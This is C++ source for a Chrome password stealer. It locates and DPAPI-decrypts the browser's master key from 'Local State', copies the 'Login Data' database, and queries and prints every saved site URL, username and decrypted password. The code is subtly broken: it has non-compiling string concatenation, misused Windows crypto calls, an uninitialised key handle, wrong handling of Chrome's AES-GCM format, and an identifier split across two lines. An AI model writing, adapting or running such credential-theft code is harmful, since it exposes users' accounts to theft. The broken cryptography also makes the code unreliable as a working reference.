#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <algorithm>
#include <Windows.h>
#include <wincrypt.h>
#include <sqlite3.h>

#pragma comment(lib, "Crypt32.lib")

std::string get_master_key() {
    std::string key;
    std::string local_state_path = std::getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
    std::ifstream file(local_state_path);
    if (file) {
        std::string local_state((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();
        size_t start = local_state.find("\"os_crypt\":{\"encrypted_key\":\"") + std::string("\"os_crypt\":{\"encrypted_key\":\"").length();
        size_t end = local_state.find("\"", start);
        std::string encrypted_key = local_state.substr(start, end - start);
        DWORD count;
        CryptStringToBinaryA(encrypted_key.c_str(), encrypted_key.length(), CRYPT_STRING_BASE64, NULL, &count, NULL, NULL);
        std::vector<BYTE> encrypted_key_bytes(count);
        CryptStringToBinaryA(encrypted_key.c_str(), encrypted_key.length(), CRYPT_STRING_BASE64, encrypted_key_bytes.data(), &count, NULL, NULL);
        encrypted_key_bytes.resize(count);
        DATA_BLOB out_data;
        out_data.cbData = encrypted_key_bytes.size();
        out_data.pbData = encrypted_key_bytes.data();
        if (CryptUnprotectData(&out_data, NULL, NULL, NULL, NULL, 0, &key)) {
            return key;
        }
    }
    return key;
}

std::vector<BYTE> decrypt_payload(HCRYPTPROV hCryptProv, HCRYPTKEY hSessionKey, const std::vector<BYTE>& payload) {
    std::vector<BYTE> decrypted_payload(payload.size());
    DWORD out_len;
    CryptDecrypt(hSessionKey, NULL, TRUE, 0, decrypted_payload.data(), &out_len);
    decrypted_payload.resize(out_len);
    return decrypted_payload;
}

HCRYPTPROV generate_cipher(const std::string& aes_key, const std::vector<BYTE>& iv) {
    HCRYPTPROV hCryptProv;
    HCRYPTKEY hSessionKey;
    CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptImportKey(hCryptProv, (LPBYTE)aes_key.c_str(), aes_key.length(), NULL, 0, &hSessionKey);
    CryptSetKeyParam(hSessionKey, KP_IV, (const BYTE*)iv.data(), 0);
    return hCryptProv;
}

std::string decrypt_password(HCRYPTPROV hCryptProv, HCRYPTKEY hSessionKey, const std::vector<BYTE>& buffer, const std::string& master_key) {
    std::string decrypted_password;
    std::vector<BYTE> iv(buffer.begin() + 3, buffer.begin() + 15);
    std::vector<BYTE> payload(buffer.begin() + 15, buffer.end());
    std::vector<BYTE> decrypted_payload = decrypt_payload(hCryptProv, hSessionKey, payload);
    decrypted_password = std::string(decrypted_payload.begin(), decrypted_payload.end());
    return decrypted_password;
}

int main() {
    std::string master_key = get_master_key();
    std::cout << "MASTER_KEY: " << master_key << std::endl;

    std::string login_db_path = std::getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";
    std::ofstream temp_copy("Loginvault.db", std::ios::binary);
    std::ifstream login_db(login_db_path, std::ios::binary);
    temp_copy << login_db.rdbuf();
    login_db.close();
    temp_copy.close();

    sqlite3* conn;
    sqlite3_open("Loginvault.db", &conn);
    sqlite3_stmt* stmt;
    sqlite3_prepare_v2(conn, "SELECT action_url, username_value, password_value FROM logins", -1, &stmt, NULL);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string url = (const char*)sqlite3_column_text(stmt, 0);
        std::string username = (const char*)sqlite3_column_text(stmt, 1);
        std::vector<BYTE> encrypted_password(sqlite3_column_blob(stmt, 2), sqlite3_column_blob(stmt, 2) + sqlite3_column_bytes(stmt, 2));
        HCRYPTPROV hCryptProv = generate_cipher(master_key, std::vector<BYTE>(16, 0));
        HCRYPTKEY hSessionKey;
        CryptDeriveKey(hCryptProv, CALG_AES_256, hSessionKey, 0);
        std::string decrypted_password = decryp
t_password(hCryptProv, hSessionKey, encrypted_password, master_key);
        CryptDestroyKey(hSessionKey);
        CryptReleaseContext(hCryptProv, 0);
        std::cout << "URL: " << url << std::endl;
        std::cout << "User Name: " << username << std::endl;
        std::cout << "Password: " << decrypted_password << std::endl;
        std::cout << std::string(50, '*') << std::endl;
    }

    sqlite3_finalize(stmt);
    sqlite3_close(conn);
    std::remove("Loginvault.db");

    return 0;
}